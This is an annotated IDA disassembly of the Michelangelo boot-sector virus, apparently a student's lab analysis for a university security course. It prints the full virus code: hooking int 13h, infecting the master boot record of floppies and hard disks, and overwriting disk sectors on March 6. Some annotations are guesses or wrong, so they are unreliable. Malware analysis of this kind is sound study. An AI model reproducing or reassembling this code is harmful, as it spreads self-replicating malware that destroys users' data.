seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/ankemla3/Desktop/ECE4117/lab2/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model small
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     beginvirus      ; jump to michealangelo malware
seg000:7C03 ; ---------------------------------------------------------------------------
seg000:7C03
seg000:7C03 loc_7C03:                               ; DATA XREF: seg000:7CF0↓r
seg000:7C03                 cmc                     ; virus Memory loc
seg000:7C03 ; ---------------------------------------------------------------------------
seg000:7C04                 db 0
seg000:7C05 word_7C05       dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07 ; ---------------------------------------------------------------------------
seg000:7C07
seg000:7C07 loc_7C07:                               ; DATA XREF: seg000:7CC1↓w
seg000:7C07                 add     cl, ds:3900h
seg000:7C0B                 xchg    ax, di
seg000:7C0C
seg000:7C0C loc_7C0C:                               ; DATA XREF: seg000:7CC7↓w
seg000:7C0C                 add     al, dh
seg000:7C0E                 push    ds              ; new int13 handler
seg000:7C0F                 push    ax              ; save ds and ax -> parameters?
seg000:7C10                 or      dl, dl          ; set lower bytes of dx to check for read or write to floppy
seg000:7C12                 jnz     short exitint13handler ; check if this is a read sector request
seg000:7C14                 xor     ax, ax
seg000:7C16                 mov     ds, ax          ; set ds=0
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; check if 43fh ->Diskette Drive Motor Status is on
seg000:7C1D                 jnz     short exitint13handler ; if so continue else exit and ret
seg000:7C1F                 pop     ax
seg000:7C20                 pop     ds              ; restore saved parameters
seg000:7C21                 pushf                   ; save flags
seg000:7C22                 call    dword ptr cs:0Ah ; jump to cs + 0AH -> virus begins??
seg000:7C27                 pushf                   ; save flags after call
seg000:7C28                 call    infectingdrive
seg000:7C2B                 popf
seg000:7C2C                 retf    2
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F exitint13handler:                       ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax
seg000:7C30                 pop     ds
seg000:7C31                 jmp     dword ptr cs:0Ah
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 infectingdrive  proc near               ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ;  initial setup
seg000:7C37                 push    bx              ; Trying to infect drive
seg000:7C38                 push    cx
seg000:7C39                 push    dx
seg000:7C3A                 push    ds
seg000:7C3B                 push    es
seg000:7C3C                 push    si
seg000:7C3D                 push    di
seg000:7C3E                 push    cs              ; save all registers on stack
seg000:7C3F                 pop     ds              ; ds=cs-> code offset
seg000:7C40                 push    cs
seg000:7C41                 pop     es              ; es=cs-> code seg
seg000:7C42                 mov     si, 4           ; attempts to try to read because disk motor has to  spin to speed which might take a little
seg000:7C45
seg000:7C45 readsectors:                            ; CODE XREF: infectingdrive+29↓j
seg000:7C45                 mov     ax, 201h        ; read a sector to check for infection
seg000:7C48                 mov     bx, 200h        ; destination is 512 bytes after virus
seg000:7C4B                 mov     cx, 1           ; read track 0, sector 1 (MBR)
seg000:7C4E                 xor     dx, dx          ; dx=0
seg000:7C50                 pushf                   ; save flags
seg000:7C51                 call    dword ptr ds:0Ah ; read boot sector for int 13
seg000:7C55                 jnb     short startingvirus ; jump if above meaning that if int 13 executed
seg000:7C55                                         ; This is essentially checking for booting based on number of tries in si
seg000:7C57                 xor     ax, ax          ; ax=0
seg000:7C59                 pushf                   ; else reset ax and store flags and try again
seg000:7C5A                 call    dword ptr ds:0Ah ; reset drive with int 13
seg000:7C5E                 dec     si              ; decrement number of tries remaining
seg000:7C5F                 jnz     short readsectors ; if tries not exceeded jump
seg000:7C61                 jmp     short returnandexit ; else exit and return
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 startingvirus:                          ; CODE XREF: infectingdrive+1F↑j
seg000:7C63                 xor     si, si          ; si=0
seg000:7C65                 cld                     ; clear direction
seg000:7C66                 lodsw                   ; load string operation -> load first word of the virus
seg000:7C67                 cmp     ax, [bx]        ; check if word loaded is the same as the boot sector
seg000:7C67                                         ; If it isnt then it hasnt been infected yet so infect with virus
seg000:7C69                 jnz     short loc_7C71
seg000:7C6B                 lodsw                   ; load next string and compare
seg000:7C6B                                         ; just to be extra extra sure infection has taken root?
seg000:7C6C                 cmp     ax, [bx+2]
seg000:7C6F                 jz      short returnandexit ; return if infected
seg000:7C71
seg000:7C71 loc_7C71:                               ; CODE XREF: infectingdrive+33↑j
seg000:7C71                 mov     ax, 301h        ; 301->Write to sector
seg000:7C74                 mov     dh, 1           ; Drive 0, head 1
seg000:7C76                 mov     cl, 3           ; sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; check byte for infection
seg000:7C7C                 jz      short loc_7C80
seg000:7C7E                 mov     cl, 0Eh         ; Set Default Drive
seg000:7C80
seg000:7C80 loc_7C80:                               ; CODE XREF: infectingdrive+46↑j
seg000:7C80                 mov     ds:8, cx
seg000:7C84                 pushf                   ; set stack as if an interrupt was called by pushing the flags
seg000:7C85                 call    dword ptr ds:0Ah ; call boot sector for int
seg000:7C89                 jb      short returnandexit ; if an error occurs returnand exit
seg000:7C8B                 mov     si, 3BEh
seg000:7C8E                 mov     di, 1BEh
seg000:7C91                 mov     cx, 21h ; '!'
seg000:7C94                 cld                     ; clear direction
seg000:7C95                 rep movsw               ; repeats string operation ecx times, movsw copies word from ds:esi to es:edi
seg000:7C95                                         ;
seg000:7C95                                         ; Copies all lines of virus
seg000:7C97                 mov     ax, 301h        ; Write to sector
seg000:7C9A                 xor     bx, bx          ; bx=0
seg000:7C9C                 mov     cx, 1           ; sector 1 drive head 0 (dx=0)
seg000:7C9F                 xor     dx, dx
seg000:7CA1                 pushf                   ; pretend to be an int
seg000:7CA2                 call    dword ptr ds:0Ah ;  Write virus to normal boot entry
seg000:7CA6
seg000:7CA6 returnandexit:                          ; CODE XREF: infectingdrive+2B↑j
seg000:7CA6                                         ; infectingdrive+39↑j ...
seg000:7CA6                 pop     di              ; restore original parameters to int 13 request for int 13
seg000:7CA7                 pop     si
seg000:7CA8                 pop     es
seg000:7CA9                 pop     ds
seg000:7CAA                 pop     dx
seg000:7CAB                 pop     cx
seg000:7CAC                 pop     bx
seg000:7CAD                 pop     ax
seg000:7CAE                 retn                    ; restore values of variables and return
seg000:7CAE infectingdrive  endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF beginvirus:                             ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; On boot execute:
seg000:7CB1                 mov     ds, ax          ; ds: points to the data segment of the memory where initialized static variables are stored;
seg000:7CB1                                         ; copied during startup routine
seg000:7CB3                 cli                     ; clear interrupt clears the IF flag in the eflags register
seg000:7CB4                 mov     ss, ax          ; stores ax=0 in ss,
seg000:7CB4                                         ;
seg000:7CB4                                         ; ss used to set up a temporary stack
seg000:7CB4                                         ;
seg000:7CB4                                         ; Push, pop, or stack data reference uses the stack segment
seg000:7CB6                 mov     ax, 7C00h       ; 7c00 is where the MBR is copied to which then enables the CPU to jump to the adress
seg000:7CB9                 mov     sp, ax          ; sp points to the top of the stack so sp = 7c00
seg000:7CB9                                         ; This sets stack pointer to just right after virus
seg000:7CBB                 sti                     ; The IF flag is set to 1
seg000:7CBB                                         ; Set interrupt flag;
seg000:7CBB                                         ; external, maskable interrupts enabled at the end of the next instruction
seg000:7CBC                 push    ds
seg000:7CBD                 push    ax              ; push 0, 7c00 on stack for later
seg000:7CBE                 mov     ax, ds:4Ch      ; 4Ch -> int13 addr offset -> Low level disk I/O routines -> Terminate Program
seg000:7CBE                                         ; 0000:004C=1DB1h
seg000:7CC1                 mov     word ptr ds:loc_7C07+3, ax ; 0000:7C0A=49EBh
seg000:7CC4                 mov     ax, ds:4Eh      ; 4Eh -> int13 seg addr ->Find First Matching File
seg000:7CC4                                         ; 0000:004E=70h
seg000:7CC4                                         ;
seg000:7CC4                                         ; Essentially saving original int13 interrupts
seg000:7CC7                 mov     word ptr ds:loc_7C0C, ax ; 0000:7C0C=2A3Ch
seg000:7CC7                                         ; DS:DX = Pointer to search string
seg000:7CCA                 mov     ax, ds:413h     ; number of k bytes in memory
seg000:7CCD                 dec     ax
seg000:7CCE                 dec     ax              ; -2k bytes reserved for virus
seg000:7CCF                 mov     ds:413h, ax     ; store new number of k bytes
seg000:7CCF                                         ; essentially make  space for virus
seg000:7CD2                 mov     cl, 6
seg000:7CD4                 shl     ax, cl          ; ax=24
seg000:7CD4                                         ; Shift w/zeros fill
seg000:7CD6                 mov     es, ax          ; ax = paragraphs of memory converted to address seg?
seg000:7CD6                                         ; Extra Segment = 24
seg000:7CD8                 mov     ds:word_7C05, ax ; word ptr ds:[7C00h+2+offset memory jump] <- ax
seg000:7CDB                 mov     ax, 0Eh         ; set new int13 handler
seg000:7CDE                 mov     ds:4Ch, ax      ; ds:4ch points to 0eh overridding previous handler offset
seg000:7CE1                 mov     word ptr ds:4Eh, es ; ds:4eh points to 0eh overridding previous handler seg
seg000:7CE5                 mov     cx, 1BEh        ; size of virus?
seg000:7CE8                 mov     si, 7C00h       ; si=offset
seg000:7CEB                 xor     di, di
seg000:7CED                 cld                     ; clear direction
seg000:7CEE                 rep movsb               ; movs copies data from ds:esi to es:edi and increments or decrements the pointers based on the setting of the direction flag.
seg000:7CF0                 jmp     dword ptr cs:loc_7C03 ; move virus into upper area of mem and then jump
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax
seg000:7CF7                 mov     es, ax          ; Set es to system seg
seg000:7CF9                 int     13h             ; Reset disk system with virus at the end of ram
seg000:7CF9                                         ;
seg000:7CF9                                         ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs
seg000:7CFC                 pop     ds              ; set ds to sys offset
seg000:7CFD                 mov     ax, 201h        ; read to sector 1
seg000:7D00                 mov     bx, 7C00h       ; the location of the read is the initial boot buffer
seg000:7D03                 mov     cx, ds:8        ; check if booting from ahard disk or a floppy disk
seg000:7D03                                         ; 7- hard disk
seg000:7D07                 cmp     cx, 7           ; sector 0, cycle 0
seg000:7D0A                 jnz     short floppyholdsector
seg000:7D0C                 mov     dx, 80h         ; Drive 80
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D11                 jmp     short checkdate ; after calling boot from storage
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 floppyholdsector:                       ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; To boot from floppy
seg000:7D17                 mov     dx, 100h        ; head 1 drive 0
seg000:7D1A                 int     13h             ; Load original boot sector int
seg000:7D1C                 jb      short checkdate ; if load succeeds jump else error
seg000:7D1E                 push    cs
seg000:7D1F                 pop     es              ; set es as code seg
seg000:7D20                 mov     ax, 201h        ; read one sector to check for infection
seg000:7D23                 mov     bx, 200h        ; location of read is 512 bytes after virus
seg000:7D26                 mov     cx, 1           ; cycle 0,sector 1 which is MBR
seg000:7D29                 mov     dx, 80h         ; first hard drive
seg000:7D2C                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D2C                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D2E                 jb      short checkdate ; if no error flag jump
seg000:7D30                 xor     si, si          ; else check if virus from floppy has infected (if virus exists on ram at 0000:xxxx)
seg000:7D32                 cld
seg000:7D33                 lodsw
seg000:7D34                 cmp     ax, [bx]
seg000:7D36                 jnz     short infectdisk
seg000:7D38                 lodsw
seg000:7D39                 cmp     ax, [bx+2]
seg000:7D3C                 jnz     short infectdisk ; see similar previous code section for comemnts
seg000:7D3E
seg000:7D3E checkdate:                              ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx          ; call int 1ah to check for date and see if its michealangelo's birthday
seg000:7D40                 mov     ah, 4
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; Check if march 6, michealango birthday
seg000:7D48                 jz      short destroydata ; if the date matches then destroy data if not return
seg000:7D4A                 retf
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B destroydata:                            ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; dx=0
seg000:7D4D                 mov     cx, 1           ; cx=1
seg000:7D50
seg000:7D50 destroysector:                          ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h
seg000:7D53                 mov     si, ds:8        ; track sectors
seg000:7D57                 cmp     si, 3           ; grab initial backup of MBR and write to segment
seg000:7D5A                 jz      short writetosectors
seg000:7D5C                 mov     al, 0Eh
seg000:7D5E                 cmp     si, 0Eh
seg000:7D61                 jz      short writetosectors
seg000:7D63                 mov     dl, 80h
seg000:7D65                 mov     byte ptr ds:7, 4
seg000:7D6A                 mov     al, 11h
seg000:7D6C
seg000:7D6C writetosectors:                         ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; grab random bx memory area
seg000:7D6F                 mov     es, bx          ; es -> offset and segment of 5000h
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; Write al sectors to drive dl
seg000:7D71                                         ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D71                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D71                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D71                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D73                 jnb     short continuewritingonerror ; jump if unsuccessful else
seg000:7D73                                         ; reset disk drive by zeroing out ah and calling interrupt
seg000:7D75                 xor     ah, ah
seg000:7D77                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 continuewritingonerror:                 ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; grab next drive head to target and destroy
seg000:7D7B                 cmp     dh, ds:7        ; check if floppy disk or hard drive is pointed to by new head
seg000:7D7F                 jb      short destroysector
seg000:7D81                 xor     dh, dh
seg000:7D83                 inc     ch              ; next track
seg000:7D85                 jmp     short destroysector ; go to next head to continue destroying
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infectdisk:                             ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; set up for checking the date for infection
seg000:7D8A                 mov     ds:8, cx
seg000:7D8E                 mov     ax, 301h        ; writing from track7 sec 0
seg000:7D91                 mov     dx, 80h         ; head 80 track 0
seg000:7D94                 int     13h             ; int 13 calls used to infect floppy
seg000:7D94                                         ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D94                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D96                 jb      short checkdate ; check date
seg000:7D98                 mov     si, 3BEh
seg000:7D9B                 mov     di, 1BEh        ; copy master partition table (partition of media for floppy or disk)
seg000:7D9E                 mov     cx, 21h ; '!'
seg000:7DA1                 rep movsw               ; repeat while cx>0 or while there is data to copy
seg000:7DA3                 mov     ax, 301h        ; write to sector-> copying virus to following sector
seg000:7DA6                 xor     bx, bx          ; reset previous offset
seg000:7DA8                 inc     cl              ; increment track and call interrupt
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAC                 jmp     short checkdate
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh ; partition table information
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
